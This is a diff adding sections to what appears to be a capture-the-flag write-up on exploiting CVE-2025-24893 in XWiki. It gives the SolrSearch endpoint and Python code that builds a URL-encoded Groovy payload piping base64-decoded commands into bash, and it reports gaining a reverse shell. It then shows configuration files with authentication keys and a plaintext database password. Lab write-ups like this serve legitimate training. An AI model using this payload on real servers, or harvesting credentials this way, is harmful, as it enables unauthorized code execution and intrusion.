@@ -67,3 +67,42 @@ Another interesting thing to note was a login page. I tried some default credent
 
 ## XWiki
 
+XWiki is an open-source wiki software for creating documentation and posts for various projects. With the version number in hand, I began searching for any security advisories and CVEs that might be relevent to this machine. After only a few searches CVE-2025-24893 looked promising as an unauthenticated Remote Code Execution (RCE) issue that takes advantage of vulnerable SolrSearch macro. 
+
+SolrSearch is an open-source serach engine that XWiki can host to index the wiki content. The crux of the vulnerability is the way that the macro evaluates search parameters using the java based scripting language Groovy. The search engine can be hit by using the endpoint '{target}/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}' with the payload passed via a URL search query. Embedding Groovy code as part of the search parameters will result in code execution on the XWiki host, enabling RCE and reverse shells.
+
+Using the Groovy scripting language as a wrapper, I prepared a base64 bash payload that pings my machine 5 times. Then I encoded it using URL encoding and queried the SolrSearch XWiki macro. With wireshark as a monitor, the remote machine successfully pinged my machine, proving the RCE vulnerability is possible. From there, I prepared a reverse shell payload and gained access as the xwiki user!
+
+```python
+>>> b64_ping = base64.b64encode(f"ping -c 5 10.10.XX.YY".encode()).decode()
+
+>>> payload = (
+...     f"}}}}}}{{{{async async=false}}}}{{{{groovy}}}}"
+...     f"\"bash -c {{echo,{b64_ping}}}|{{base64,-d}}|{{bash,-i}}\".execute()"
+...     f"{{{{/groovy}}}}{{{{/async}}}}"
+... )
+
+>>> enc_payload = urllib.parse.quote(payload, safe="=,-,")
+
+>>> print(enc_payload)
+%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho,cG********************E0Ljc3%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
+>>> 
+```
+
+![Ping traffic after successful RCE](editor_ping.png)
+
+## Web User Enumeration
+
+```bash
+$ cat configuration.properties
+xwiki.authentication.validationKey = \uBF48\u0EE2\u03FE\u4B0F\u3C8E\u35DA\uEEB8\u4013\u1E90\uF9A7\u4040\u28EA\uD217\u288BF\u6AF7\u377E\u295C\uC98D\u17FB5\uD3D4\u967F\uB8DE\u955B\uD54B\uEE55\u890D\uAFFC\u993B\u1C49\u9B87
+xwiki.authentication.encryptionKey = \uC327\u7B18\u1FFE\u913D\uEDBD\u6C85\uE778\uD7C6\u91D0\uA56F\uE1CB\u014B\uD03E\u9E5D\uED9D\uB44A\u3A0C\u1C76\uF0D6\u8289\u645F\u6EB8\u00EB\u99DA\u589E\uE3CE\uC24A\u9486\u5EAB\u2E85\uCCEB\uAF4D
+```
+
+```xml
+xwiki@editor:/usr/lib/xwiki/WEB-INF$cat hibernate.cfg.xml
+<property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>                        
+<property name="hibernate.connection.username">xwiki<property>                                                                                                                     
+<property name="hibernate.connection.password">theEd1t0rTeam99</property>
+```
+
